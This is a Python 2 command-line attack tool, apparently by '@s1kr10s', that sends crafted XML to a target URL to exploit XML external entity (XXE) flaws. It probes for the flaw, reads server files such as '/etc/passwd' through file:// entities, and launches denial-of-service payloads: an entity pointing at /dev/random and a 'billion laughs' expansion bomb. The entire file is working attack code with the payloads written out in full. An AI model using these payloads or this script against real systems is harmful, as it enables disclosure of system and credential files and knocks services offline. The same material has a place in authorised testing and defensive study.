#!/usr/bin/python
import argparse
import requests

RED = '\x1b[91m'
RED1 = '\033[31m'
BLUE = '\033[94m'
GREEN = '\033[32m'
OTRO = '\033[36m'
BOLD = '\033[1m'
NORMAL = '\033[0m'
ENDC = '\033[0m'

logo = BOLD + """
    :::    ::: :::    ::: :::::::::: 
    :+:    :+: :+:    :+: :+:        
     +:+  +:+   +:+  +:+  +:+        
      +#++:+     +#++:+   +#++:++#   
     +#+  +#+   +#+  +#+  +#+        
    #+#    #+# #+#    #+# #+#        
    ###    ### ###    ### ##########
            XML Injection XXE
""" + ENDC
logo += """    
    Version : 1.1 
    Twitter : @s1kr10s
    WebSite : http://dth-security.blogspot.com
"""
print logo
ap = argparse.ArgumentParser()
ap.add_argument("-u", "--url", required=True,
                help="Url Ej: --url http://www.victima.com")
ap.add_argument("-p", "--post", required=True,
                help="Data del Post Ej: --post '<forgot>{xxe}</forgot>'")
ap.add_argument("-r", "--read", required=False,
                help="Read File Ej: --read '/etc/passwd'")
ap.add_argument("-a", "--atk", required=False,
                help="Ataque DOS Ej: --atk dos1 - dos2")
args = vars(ap.parse_args())

url = args["url"]
post = args["post"]
read = args["read"]
dos = args["atk"]
attdos = [
    '/dev/random'
]

def postvul(post):
    inject = post.replace('{xxe}', '&myxxe;')
    xml = '<?xml version="1.0" encoding="utf-8"?>'
    xml += '<!DOCTYPE Anything [<!ENTITY myxxe "Vulnerable"> ]>'
    xml += inject
    return xml

def readvul(post, read):
    inject = post.replace('{xxe}', '&myxxe;')
    metodo = read.split('://')
    file = "file://"
    xml = '<?xml version="1.0" encoding="utf-8"?>'
    if metodo[0] <> 'http' or metodo[0] <> 'https':
        xml += '<!DOCTYPE Anything [<!ENTITY myxxe SYSTEM "' + file + read + '"> ]>'
    elif metodo[0] == 'http' or metodo[0] == 'https':
        xml += '<!DOCTYPE Anything [<!ENTITY myxxe SYSTEM "' + read + '"> ]>'
    xml += inject
    return xml

def dosvul():
    xml = """
    <?xml version="1.0"?>
    <!DOCTYPE lolz [
    <!ENTITY lol "lol">
    <!ELEMENT lolz (#PCDATA)>
    <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
    <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
    <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
    <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
    <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
    <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
    <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
    <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
   ]>
   <lolz>&lol9;</lolz>
"""
    return xml

def getvul(url, post, read, dos):
    if read == None and dos == None:
        xml = postvul(post)
        headers = {'Content-Type': 'application/xml'}
        info = requests.post(url, data=xml, headers=headers).text
        if str(info) == "Vulnerable":
            return "1|p|" + str(info)
        else:
            return "0|p|" + str(info)
    elif dos == 'dos1' and read == None:
        xml = postvul(post)
        headers = {'Content-Type': 'application/xml'}
        info = requests.post(url, data=xml, headers=headers).text
        if str(info) == "Vulnerable":
            return "1|d1|" + str(info)
        else:
            return "0|d1|" + str(info)
    elif dos == 'dos2' and read == None:
        xml = postvul(post)
        headers = {'Content-Type': 'application/xml'}
        info = requests.post(url, data=xml, headers=headers).text
        if str(info) == "Vulnerable":
            return "1|d2|" + str(info)
        else:
            return "0|d2|" + str(info)
    elif read <> None:
        xml = readvul(post, read)
        headers = {'Content-Type': 'application/xml'}
        info = requests.post(url, data=xml, headers=headers).text
        if str(info) == "" or str(info) <> "unknown":
            return "1|r|" + str(info)
        else:
            xml = postvul(post)
            headers = {'Content-Type': 'application/xml'}
            info = requests.post(url, data=xml, headers=headers).text
            if str(info) == "Vulnerable":
                return "0|rr|" + str(info)

estado = getvul(url, post, read, dos)
est = estado.split('|')
if str(est[0]) == '1':
    print OTRO + "  ====INFO=====================" + ENDC
    print BLUE + "  WebSite : " + ENDC + BOLD + url + ENDC
    print BLUE + "  Sistema : " + ENDC + RED + "Vulnerable" + ENDC + "\n"
    if str(est[1]) == 'r':
        print OTRO + "  ====FILE=====================" + ENDC
        print BLUE + "  File Found: " + ENDC + RED + read + ENDC
        if len(est[2]) > 1:
            print BLUE + "  Lectura   : " + ENDC + RED1 + est[2] + ENDC
        else:    
            print GREEN + "  No hay permisos para leer el archivo!" + ENDC + "\n"
    if str(est[1]) == 'd1':
        for reados in attdos:
            xml = readvul(post, reados)
            headers = {'Content-Type': 'application/xml'}
            info = requests.post(url, data=xml, headers=headers).text
    if str(est[1]) == 'd2':
        xml = dosvul()
        headers = {'Content-Type': 'application/xml'}
        info = requests.post(url, data=xml, headers=headers).text
else:
    if str(est[1]) == 'rr':
        print OTRO + "  ====INFO=====================" + ENDC
        print BLUE + "  WebSite : " + ENDC + BOLD + url + ENDC
        print BLUE + "  Sistema : " + ENDC + RED + "Vulnerable" + ENDC + "\n"
        print OTRO + "  ====FILE=====================" + ENDC
        print BLUE + "  File/Url Not: " + ENDC + GREEN + read + ENDC + "\n"
    else:
        print OTRO + "  ====INFO=====================" + ENDC
        print BLUE + "  WebSite : " + ENDC + BOLD + url + ENDC
        print BLUE + "  Sistema : " + ENDC + GREEN + "No Vulnerable" + ENDC + "\n"
            
